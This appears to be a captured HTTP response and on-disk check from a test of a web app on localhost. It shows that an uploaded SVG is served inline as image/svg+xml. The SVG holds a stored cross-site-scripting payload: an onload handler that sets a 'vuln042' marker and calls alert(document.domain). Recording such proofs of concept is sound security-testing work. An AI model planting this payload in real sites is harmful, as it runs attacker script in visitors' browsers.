@@ -1,0 +1,10 @@
+GET http://localhost:33116/public/995b1a92-a9d2-46e4-8e05-f61cc1451183.svg (no cookies)
+HTTP 200
+Content-Type: image/svg+xml
+Content-Disposition: (none)
+
+--- body ---
+<svg xmlns="http://www.w3.org/2000/svg" onload="window.top.__vuln042_fired=true; alert(document.domain)"><circle cx="10" cy="10" r="5"/></svg>
+
+--- on-disk public/995b1a92-a9d2-46e4-8e05-f61cc1451183.svg via docker exec (app container) ---
+<svg xmlns="http://www.w3.org/2000/svg" onload="window.top.__vuln042_fired=true; alert(document.domain)"><circle cx="10" cy="10" r="5"/></svg>
